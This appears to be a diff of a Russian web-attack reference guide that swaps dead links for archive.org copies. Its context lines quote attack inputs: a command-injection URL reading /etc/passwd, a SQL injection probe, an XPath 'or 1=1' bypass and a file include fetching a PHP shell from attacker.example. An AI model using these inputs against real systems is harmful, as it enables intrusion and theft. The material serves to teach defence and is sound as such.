@@ -39,8 +39,8 @@ SSTI (Server-Side Template Injection) возникает при подстано
 
 **Ссылки:**
 
-- [Inside the Buffer Overflow Attack: Mechanism, Method and Prevention](http://www.sans.org/rr/code/inside_buffer.php) -- By Mark E. Donaldson, GSEC
-- [w00w00 on Heap Overflows](http://www.w00w00.org/files/articles/heaptut.txt) -- By Matt Conover, w00w00 Security Team
+- [Inside the Buffer Overflow Attack: Mechanism, Method and Prevention](https://web.archive.org/web/20231128065337/http://www.sans.org/rr/code/inside_buffer.php) -- By Mark E. Donaldson, GSEC
+- [w00w00 on Heap Overflows](https://web.archive.org/web/20260824105355/http://www.w00w00.org/files/articles/heaptut.txt) -- By Matt Conover, w00w00 Security Team
 - [Smashing The Stack For Fun And Profit](http://www.insecure.org/stf/smashstack.txt) -- By Aleph One, Phrack 49
 
 ### Атака на функции форматирования строк (Format String Attack)
@@ -71,10 +71,10 @@ printf(emailAddress);
 
 **Ссылки:**
 
-- [(Maybe) the first publicly known Format Strings exploit](http://archives.neohapsis.com/archives/bugtraq/1999-q3/1009.html)
-- [Analysis of format string bugs](http://downloads.securityfocus.com/library/format-bug-analysis.pdf) -- By Andreas Thuemmel
+- [(Maybe) the first publicly known Format Strings exploit](https://web.archive.org/web/20160306024419/http://archives.neohapsis.com/archives/bugtraq/1999-q3/1009.html)
+- [Analysis of format string bugs](https://web.archive.org/web/20181101155737/http://downloads.securityfocus.com/library/format-bug-analysis.pdf) -- By Andreas Thuemmel
 - [Format string input validation error in wu-ftpd site_exec() function](http://www.kb.cert.org/vuls/id/29823)
-- [Ошибки переполнения буфера извне и изнутри как обобщенный опыт](http://www.samag.ru/art/03.2004/03.2004_07.pdf) -- Крис Касперски (рус.)
+- [Ошибки переполнения буфера извне и изнутри как обобщенный опыт](https://web.archive.org/web/20220303112459/http://www.samag.ru/art/03.2004/03.2004_07.pdf) -- Крис Касперски (рус.)
 - [Эксплуатирование SEH в среде Win32](http://www.securitylab.ru/contest/212085.php) -- houseofdabus (рус.)
 
 ### Внедрение операторов LDAP (LDAP Injection)
@@ -141,9 +141,9 @@ http://example/ldapsearch.asp?user=*
 
 **Ссылки:**
 
-- [LDAP Injection: Are Your Web Applications Vulnerable?](http://www.spidynamics.com/whitepapers/LDAPinjection.pdf) -- By Sacha Faust, SPI Dynamics
+- [LDAP Injection: Are Your Web Applications Vulnerable?](https://web.archive.org/web/20240128031648/http://www.spidynamics.com/whitepapers/LDAPinjection.pdf) -- By Sacha Faust, SPI Dynamics
 - [A String Representation of LDAP Search Filters](http://www.ietf.org/rfc/rfc1960.txt)
-- [Understanding LDAP](http://www.redbooks.ibm.com/redbooks/SG244986.html)
+- [Understanding LDAP](https://web.archive.org/web/20251218133301/http://www.redbooks.ibm.com/redbooks/SG244986.html)
 
 ### Выполнение команд ОС (OS Commanding)
 
@@ -189,9 +189,9 @@ http://example/directory.php?dir=%3Bcat%20/etc/passwd
 
 **Ссылки:**
 
-- [Perl CGI Problems](http://www.wiretrip.net/rfp/txt/phrack55.txt) -- By RFP, Phrack Magazine, Issue 55
+- [Perl CGI Problems](https://web.archive.org/web/20251219071327/http://www.wiretrip.net/rfp/txt/phrack55.txt) -- By RFP, Phrack Magazine, Issue 55
 - [Marcus Xenakis directory.php Shell Command Execution Vulnerability](http://www.securityfocus.com/bid/4278)
-- [NCSA Secure Programming Guidelines](http://archive.ncsa.uiuc.edu/General/Grid/ACES/security/programming/#cgi)
+- [NCSA Secure Programming Guidelines](https://web.archive.org/web/20260511031806/http://archive.ncsa.uiuc.edu/General/Grid/ACES/security/programming/#cgi)
 
 === "Уязвимый код"
 
@@ -286,13 +286,13 @@ http://example/article.asp?ID=2+and+1=0   (вернется ошибка или 
 
 **Ссылки:**
 
-- [SQL Injection: Are your Web Applications Vulnerable](http://www.spidynamics.com/support/whitepapers/WhitepaperSQLInjection.pdf) -- SPI Dynamics
-- [Blind SQL Injection: Are your Web Applications Vulnerable](http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf) -- SPI Dynamics
+- [SQL Injection: Are your Web Applications Vulnerable](https://web.archive.org/web/20210212070333/http://www.spidynamics.com/support/whitepapers/WhitepaperSQLInjection.pdf) -- SPI Dynamics
+- [Blind SQL Injection: Are your Web Applications Vulnerable](https://web.archive.org/web/20250829110736/http://www.spidynamics.com/support/whitepapers/Blind_SQLInjection.pdf) -- SPI Dynamics
 - [Advanced SQL Injection in SQL Server Applications](http://www.nextgenss.com/papers/advanced_sql_injection.pdf) -- Chris Anley, NGSSoftware
 - [More advanced SQL Injection](http://www.nextgenss.com/papers/more_advanced_sql_injection.pdf) -- Chris Anley, NGSSoftware
-- [SQL Injection Walkthrough](http://www.securiteam.com/securityreviews/5DP0N1P76E.html)
+- [SQL Injection Walkthrough](https://web.archive.org/web/20260903193846/http://www.securiteam.com/securityreviews/5DP0N1P76E.html)
 - [Blind SQL Injection -- Imperva](http://www.imperva.com/application_defense_center/white_papers/blind_sql_server_injection.html)
-- [Introduction to SQL Injection Attacks for Oracle Developers -- Integrigy](http://www.net-security.org/dl/articles/IntegrigyIntrotoSQLInjectionAttacks.pdf)
+- [Introduction to SQL Injection Attacks for Oracle Developers -- Integrigy](https://web.archive.org/web/20260227122230/http://www.net-security.org/dl/articles/IntegrigyIntrotoSQLInjectionAttacks.pdf)
 - [Управление Microsoft SQL Server используя SQL инъекции](http://www.securitylab.ru/analytics/216396.php) -- Cesar Cerrudo (рус.)
 - [Внедрение SQL кода с завязанными глазами](http://www.securitylab.ru/analytics/216332.php) -- Офер Маор, Амичай Шалман (рус.)
 - [SQL инъекция и ORACLE](http://www.securitylab.ru/analytics/216253.php) (рус.)
@@ -378,7 +378,7 @@ http://portal.example/index.php?template=http://attacker.example/phpshell
 
 **Ссылки:**
 
-- [Server Side Includes (SSI)](http://hoohoo.ncsa.uiuc.edu/docs/tutorials/includes.html) -- NCSA HTTPd
+- [Server Side Includes (SSI)](https://web.archive.org/web/20090708130539/http://hoohoo.ncsa.uiuc.edu/docs/tutorials/includes.html) -- NCSA HTTPd
 - [Security Tips for Server Configuration](http://httpd.apache.org/docs/misc/security_tips.html#ssi) -- Apache HTTPD
 - [Header Based Exploitation: Web Statistical Software Threats](http://www.cgisecurity.net/papers/header-based-exploitation.txt) -- CGISecurity.com
 - [Santi worm](http://www.f-secure.com/v-descs/santy_a.shtml)
@@ -435,4 +435,4 @@ string(//user[name/text()='' or 1=1 or ''='' and password/text()='foobar']/accou
 
 - [XML Path Language (XPath) Version 1.0](http://www.w3.org/TR/xpath) -- W3C Recommendation
 - [Encoding a Taxonomy of Web Attacks with Different-Length Vectors](http://arxiv.org/PS_cache/cs/pdf/0210/0210026.pdf) -- G. Alvarez and S. Petrovic
-- [Blind XPath Injection](http://www.sanctuminc.com/pdfc/WhitePaper_Blind_XPath_Injection_20040518.pdf) -- Amit Klein
+- [Blind XPath Injection](https://web.archive.org/web/20240619111308/http://www.sanctuminc.com/pdfc/WhitePaper_Blind_XPath_Injection_20040518.pdf) -- Amit Klein
